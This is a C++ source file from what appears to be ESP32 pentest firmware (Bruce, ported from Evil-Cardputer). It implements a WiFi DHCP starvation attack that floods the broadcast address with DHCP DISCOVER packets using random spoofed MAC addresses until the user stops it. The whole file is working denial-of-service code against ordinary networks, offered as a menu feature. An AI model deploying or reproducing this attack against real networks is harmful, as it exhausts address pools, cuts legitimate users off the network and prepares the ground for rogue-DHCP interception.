/*
 * Ported from Evil-Cardputer (Evil-M5Project) by 7h30th3r0n3.
 * WiFi STA DHCP starvation (not Ethernet W5500).
 * Combined firmware: AGPL-3.0-or-later (Bruce).
 */
#include "dhcp_starvation.h"
#if defined(EVIL_EXTENSIONS)
#include "root/net/wifi_common.h"
#include "root/ui/display.h"
#include <WiFi.h>
#include <WiFiUdp.h>
#include <globals.h>

namespace {

void dhcpDiscover(WiFiUDP &udp, const uint8_t mac[6], uint32_t xid) {
    uint8_t pkt[300];
    memset(pkt, 0, sizeof(pkt));
    pkt[0] = 1;
    pkt[1] = 1;
    pkt[2] = 6;
    memcpy(pkt + 4, &xid, 4);
    memcpy(pkt + 28, mac, 6);
    pkt[236] = 99;
    pkt[237] = 130;
    pkt[238] = 83;
    pkt[239] = 99;
    pkt[240] = 53;
    pkt[241] = 1;
    pkt[242] = 1;
    pkt[243] = 255;
    udp.beginPacket(IPAddress(255, 255, 255, 255), 67);
    udp.write(pkt, 244);
    udp.endPacket();
}

} // namespace

void dhcpStarvationMenu() {
    if (!WiFi.isConnected()) {
        if (!wifiConnectMenu(WIFI_STA)) return;
    }
    WiFiUDP udp;
    if (!udp.begin(68)) {
        displayError("UDP :68 failed", true);
        return;
    }
    int sent = 0;
    drawMainBorderWithTitle("DHCP Starvation");
    tft.drawString("ESC to stop", 10, tftHeight - 20);
    EscPress = false;
    while (!check(EscPress) && !returnToMenu) {
        uint8_t mac[6];
        for (int i = 0; i < 6; i++) mac[i] = random(256);
        mac[0] = (mac[0] & 0xFE) | 0x02;
        uint32_t xid = random(0x7fffffff);
        dhcpDiscover(udp, mac, xid);
        sent++;
        if (sent % 5 == 0) {
            tft.fillRect(10, 40, tftWidth - 20, 16, kvxConfig.bgColor);
            tft.drawString("Discovers: " + String(sent), 10, 40);
        }
        delay(40);
    }
    udp.stop();
    displayInfo("Sent " + String(sent) + " discovers", true);
}
#endif
